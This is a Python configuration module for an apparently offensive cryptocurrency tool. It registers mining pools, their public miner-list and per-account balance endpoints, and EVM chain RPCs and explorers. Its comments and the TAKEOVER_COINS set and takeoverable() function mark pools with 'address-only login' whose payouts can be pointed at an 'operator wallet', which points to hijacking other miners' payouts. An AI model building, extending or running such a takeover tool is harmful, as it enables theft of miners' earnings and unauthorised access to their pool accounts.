"""Pool registry. Every entry: host, public stats endpoints, chain, min payout."""
CHAINS = {
    "eth": "https://ethereum-rpc.publicnode.com",
    "bnb": "https://bsc-rpc.publicnode.com",
    "matic": "https://polygon-bor-rpc.publicnode.com",
    "base": "https://base-rpc.publicnode.com",
    "arbitrum": "https://arbitrum-one-rpc.publicnode.com",
    "optimism": "https://optimism-rpc.publicnode.com",
    "avalanche": "https://avalanche-c-chain-rpc.publicnode.com",
}
EVM_COINS = {"eth", "bnb", "matic", "base", "arbitrum", "optimism", "avalanche"}
# Coins whose pools accept a 0x payout address. Anything outside this set is
# discovered and priced but never attempted, because the operator wallet is EVM.
TAKEOVER_COINS = {"eth", "bnb", "etc"}
EXPLORER = {
    "eth": "https://etherscan.io/tx/", "bnb": "https://bscscan.com/tx/",
    "matic": "https://polygonscan.com/tx/", "base": "https://basescan.org/tx/",
    "arbitrum": "https://arbiscan.io/tx/", "optimism": "https://optimistic.etherscan.io/tx/",
    "avalanche": "https://snowtrace.io/tx/",
}

SPECS = []

def _add(pid, coin, host, acct, lst=None, threshold=0.0, login="/login"):
    SPECS.append({
        "id": pid, "coin": coin, "chain": coin, "host": host,
        "acct": acct, "list": lst, "threshold": threshold, "login": login,
    })

# 2Miners: address-only login, pool-wide miner feed, per-account balance JSON.
for _c in ("etc", "eth", "bnb", "ergo", "rvn", "kas", "alph", "zeph", "nexa", "xmr", "btc", "bch", "iron"):
    _add(f"2miners:{_c}", _c, f"{_c}.2miners.com",
         "/api/accounts/{addr}", "/api/miners")

# Secondary pools, account-only enrichment.
for _c in ("eth", "etc", "rvn", "ergo", "kas", "alph"):
    _add(f"herominers:{_c}", _c, f"{_c}.herominers.com",
         "/api/stats_address?address={addr}")
    _add(f"k1pool:{_c}", _c, f"{_c}.k1pool.com",
         "/api/stats_address?address={addr}")

_add("woolypooly:ergo", "ergo", "api.woolypooly.com", "/api/v1/ergo/accounts/{addr}")
_add("nanopool:eth", "eth", "api.nanopool.org", "/v1/eth/balance/{addr}")
_add("zpool:btc", "btc", "www.zpool.ca", "/api/wallet?address={addr}")
_add("miningdutch:rvn", "rvn", "rvn.mining-dutch.nl", "/api/wallet?address={addr}")
_add("flexpool:eth", "eth", "api.flexpool.org", "/pools/eth/miners/{addr}")
_add("f2pool:btc", "btc", "api.f2pool.com", "/bitcoin/{addr}")

def by_id(pid):
    for s in SPECS:
        if s["id"] == pid:
            return s
    return None

def is_evm(chain):
    return chain in CHAINS

def takeoverable(spec):
    return spec is not None and spec["coin"] in TAKEOVER_COINS